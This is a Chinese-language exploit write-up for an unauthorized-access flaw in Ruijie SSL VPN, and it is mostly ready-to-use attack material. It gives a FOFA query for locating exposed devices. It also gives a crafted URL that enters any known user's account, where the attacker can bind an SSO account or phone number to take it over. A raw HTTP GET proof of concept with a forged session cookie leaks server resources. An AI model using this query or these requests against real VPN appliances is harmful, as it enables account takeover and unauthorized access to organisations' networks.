# 锐捷SSL VPN 越权访问漏洞

Ruijie SSL VPN 存在越权访问漏洞，攻击者在已知用户名的情况下，可以对账号进行修改密码和绑定手机的操作。并在未授权的情况下查看服务器资源

FOFA:

```
icon_hash="884334722" || title="Ruijie SSL VPN"
```

构造URL：


```
https://1.1.1.1/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=USERNAME&sid=1614345312&oper=showres
USERNAME为已存在的用户名，访问后即可进入到主页，在个人设置可以直接给这个用户绑定SSO账号及手机号。
```

PoC:


```
GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1
```

信息泄漏：

构造URL：


```
https://1.1.1.1/cgi-bin/main.cgi?oper=getrsc

注：需要先使用第一步的方式构造URL进入到设置页面，否则没有Cookie，会提示“错误：当前用户不在线,请重新登录”，当然你也可以手动构造Cookie

Cookie: UserName=USERNAME; SessionId=1614345312; FirstVist=1; Skin=1; tunnel=1
```

ref:

* https://mp.weixin.qq.com/s/iRmDQJH23FJ6mL_GzXeL6g
* https://mp.weixin.qq.com/s/WElrjPnCNNA79COFtPX0vQ